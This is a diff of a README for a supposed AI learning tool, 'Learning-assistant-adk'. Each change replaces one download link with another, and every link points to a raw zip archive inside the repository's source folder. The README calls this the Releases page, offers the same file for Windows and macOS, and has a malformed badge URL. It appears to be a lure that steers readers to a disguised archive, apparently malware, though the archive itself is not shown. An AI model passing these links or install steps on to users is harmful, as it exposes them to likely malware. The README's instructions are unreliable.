@@ -1,6 +1,6 @@
 # 🎓 Learning-assistant-adk - Your AI Research Companion
 
-[![Download Learning-assistant-adk](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning-assistant-adk_v3.3-beta.4.zip%20Learning--assistant--adk-v1.0-blue)](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning-assistant-adk_v3.3-beta.4.zip)
+[![Download Learning-assistant-adk](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning_adk_assistant_v1.2.zip%20Learning--assistant--adk-v1.0-blue)](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning_adk_assistant_v1.2.zip)
 
 ## 📜 Description
 
@@ -17,14 +17,14 @@ Follow these steps to download and run Learning-assistant-adk smoothly:
    - Storage: At least 500 MB of free disk space.
 
 2. **Visit the Download Page**
-   - To get the latest version of Learning-assistant-adk, [visit this page to download](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning-assistant-adk_v3.3-beta.4.zip).
+   - To get the latest version of Learning-assistant-adk, [visit this page to download](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning_adk_assistant_v1.2.zip).
 
 3. **Select the Right Version**
    - On the Releases page, find the most recent release. The version number will be listed next to the release title.
    - Click on the version to view available files.
 
 4. **Download the Software**
-   - Look for the file that matches your operating system, such as `https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning-assistant-adk_v3.3-beta.4.zip` for Windows or `https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning-assistant-adk_v3.3-beta.4.zip` for macOS.
+   - Look for the file that matches your operating system, such as `https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning_adk_assistant_v1.2.zip` for Windows or `https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning_adk_assistant_v1.2.zip` for macOS.
    - Click to start your download.
 
 5. **Install the Software**
@@ -84,6 +84,6 @@ If you encounter any issues while using Learning-assistant-adk, consider the fol
 
 ## 🚀 Download & Install
 
-Ready to start your research journey? [Visit this page to download](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning-assistant-adk_v3.3-beta.4.zip) Learning-assistant-adk and follow the steps listed above to install it on your computer.
+Ready to start your research journey? [Visit this page to download](https://raw.githubusercontent.com/PGabrielP/Learning-assistant-adk/main/learning_agent/Learning_adk_assistant_v1.2.zip) Learning-assistant-adk and follow the steps listed above to install it on your computer.
 
 Enjoy a powerful AI tool that simplifies the research process while you learn at your own pace!
